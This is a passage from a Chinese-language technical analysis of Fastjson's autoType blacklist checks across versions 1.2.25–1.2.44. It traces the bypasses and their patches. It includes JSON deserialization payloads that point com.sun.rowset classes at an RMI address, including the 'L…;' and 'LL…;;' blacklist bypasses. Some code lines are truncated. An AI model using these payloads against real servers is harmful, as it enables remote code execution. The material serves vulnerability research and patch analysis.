                    String deny = denyList[i];
                    if (className.startsWith(deny)) {
                        throw new JSONException("autoType is not support. " + typeName);
                    }
                }
                //对白名单，进行匹配；如果匹配中，调用loadClass加载，赋值clazz直接返回
                for (int i = 0; i  " + expectClass.getName());
                        }
                        return clazz;
                    }
                }
            }
            //此处省略了当clazz不为null时的处理情况，与expectClass有关
            //但是我们这里输入固定是null，不执行此处代码
            //可以发现如果上面没有触发黑名单，返回，也没有触发白名单匹配中的话，就会在此处被拦截报错返回。
            if (!autoTypeSupport) {
                throw new JSONException("autoType is not support. " + typeName);
            }
            //执行不到此处
            return clazz;
    }
可以得出在默认的`AutoTypeSupport为False`时，要求不匹配到黑名单，同时必须匹配到白名单的class才可以成功加载。
看一下默认黑名单，默认白名单（最下面，默认为空）
这条路完全被白名单堵死了,所以默认的情况下是不可能绕过的。我们的两个payload也都被com.sun这一条黑名单给匹配了。
### 1.2.25-1.2.41绕过
所以接下来所谓的绕过都是在服务端显性开启`AutoTypeSupport为True`的情况下进行的。（这是一个很大的限制条件）
我们先来看显性修改`AutoTypeSupport为True`时的代码：
`1.2.25版本com.alibaba.fastjson.parser.ParserConfig#checkAutoType(关闭白名单机制)`
    public Class checkAutoType(String typeName, Class expectClass) {
            if (typeName == null) {
                return null;
            }
            final String className = typeName.replace('$', '.');
            if (autoTypeSupport || expectClass != null) {
                //先进行白名单匹配，如果匹配成功则直接返回。可见所谓的关闭白名单机制是不只限于白名单
                for (int i = 0; i  " + expectClass.getName());
                    }
                }
            }
            //返回加载的class
            return clazz;
    }
可见在显性关闭白名单的情况下，我们也需要绕过黑名单检测，同时加载的类不能继承自Classloader与DataSource。
看似我们只能找到其他的利用类跟黑名单进行硬刚。但我们再跟一下类的加载`TypeUtils.loadClass`就会有所发现。
    public static Class loadClass(String className, ClassLoader classLoader) {
            if (className == null || className.length() == 0) {
                return null;
            }
            Class clazz = mappings.get(className);
            if (clazz != null) {
                return clazz;
            }
            //特殊处理1！
            if (className.charAt(0) == '[') {
                Class componentType = loadClass(className.substring(1), classLoader);
                return Array.newInstance(componentType, 0).getClass();
            }
            //特殊处理2！
            if (className.startsWith("L") && className.endsWith(";")) {
                String newClassName = className.substring(1, className.length() - 1);
                return loadClass(newClassName, classLoader);
            }
        ...
  * 如果这个className是以`[`开头我们会去掉`[`进行加载！
但是实际上在代码中也可以看见它会返回Array的实例变成数组。在实际中它远远不会执行到这一步，在json串解析时就已经报错。
  * 如果这个className是以`L`开头`;`结尾，就会去掉开头和结尾进行加载！
那么加上`L`开头`;`结尾实际上就可以绕过所有黑名单。那么理所当然的payload就为：
    //1.2.25-41绕过 jndi ldap
    {"被屏蔽的type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}
    //1.2.25-41绕过 7u21
    同样加上L;，payload太长了且不唯一，就不写了
### 1.2.42版本修复
在1.2.42中对于1.2.41版本进行了修复，对于两个jar进行对比可以发现`DefaultJSONParser.java`没有什么关键的修改。
关键是在`ParserConfig.java`中修改了以下两点：
  1. 修改明文黑名单为黑名单hash
  2. 对于传入的类名，删除开头`L`和结尾的`;`
黑名单大致形式如下：
虽然说利用hash可以让我们不知道禁用了什么类，但是加密方式是有写`com.alibaba.fastjson.parser.ParserConfig#addDeny`中的`com.alibaba.fastjson.util.TypeUtils#fnv1a_64`，我们理论上可以遍历jar，字符串，类去碰撞得到这个hash的值。（因为常用的包是有限的）
    public static long fnv1a_64(String key){
            long hashCode = 0xcbf29ce484222325L;
            for(int i = 0; i , int)`
    // hash算法常量
            final long BASIC = 0xcbf29ce484222325L;
            final long PRIME = 0x100000001b3L;
            // 对传入类名的第一位和最后一位做了hash，如果是L开头，;结尾，删去开头结尾
            // 可以发现这边只进行了一次删除
            if ((((BASIC
                    ^ className.charAt(0))
                    * PRIME)
                    ^ className.charAt(className.length() - 1))
                    * PRIME == 0x9198507b5af98f0L)
            {
                className = className.substring(1, className.length() - 1);
            }
            // 计算处理后的类名的前三个字符的hash
            final long h3 = (((((BASIC ^ className.charAt(0))
                    * PRIME)
                    ^ className.charAt(1))
                    * PRIME)
                    ^ className.charAt(2))
                    * PRIME;
            if (autoTypeSupport || expectClass != null) {
                long hash = h3;
                //基于前三个字符的hash结果继续进行hash运算
                //这边一位一位运算比较其实就相当于之前的startswith，开头匹配
                for (int i = 3; i = 0) {
                        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
                        if (clazz != null) {
                            return clazz;
                        }
                    }
                    //将运算结果跟黑名单做比对
                    if (Arrays.binarySearch(denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null) {
                        throw new JSONException("autoType is not support. " + typeName);
                    }
                }
            }
            //之后就是一样的处理，根据类名加载类
确实有效的干掉了L开头；结尾的payload。
### 1.2.42绕过
但是可以发现在以上的处理中，只删除了一次开头的`L`和结尾的`;`，这里就好像使用黑名单预防SQL注入，只删除了一次敏感词汇的防御错误一样，重复一下就可以被轻易的绕过。所以payload如下：
    //1.2.42绕过 jndi ldap
    {"被屏蔽的type":"LLcom.sun.rowset.RowSetImpl;;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}
    //1.2.42绕过 7u21
    同样加上LL ;;，payload太长了且不唯一，就不写了
### 1.2.43版本修复
在1.2.43中对于1.2.42版本可绕过的情况进行了修复。
修改了`com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String,
java.lang.Class, int)`的部分代码
    //hash计算基础参数
                long BASIC = -3750763034362895579L;
                long PRIME = 1099511628211L;
                //L开头，；结尾
                if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
                    //LL开头
                    if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) {
                        //直接爆出异常
                        throw new JSONException("autoType is not support. " + typeName);
                    }
                    className = className.substring(1, className.length() - 1);
                }
可见就对了LL开头的绕过进行了封堵。
至此我们之前的两个利用链JdbcRowSetImpl和TemplatesImpl正式被封堵了（暂时）。在服务端放开白名单限制的情况下也绕不过黑名单。更别说服务端默认是开启白名单的，这时候fastjson的风险已经很小了。
之后就是不断有新的组件作为利用链引入进行攻击，和黑名单的不断扩充之间的拉锯战。（之前也说过着一切都是在显性关闭白名单的情况下）
### 1.2.44 [ 限制
1.2.44补充了loadclass时`[`的利用情况，上面说到过，实际上这种形式的payload是用不了的。
比如FastjsonExpliot框架中的`{"被屏蔽的type":"[com.sun.rowset.JdbcRowSetImpl","dataSourceName":"###RMI_LDAP_ADDRESS###","autoCommit":true}`
但是在1.2.44中仍然对于这类类名进行了限制，使用同样的payload进行测试。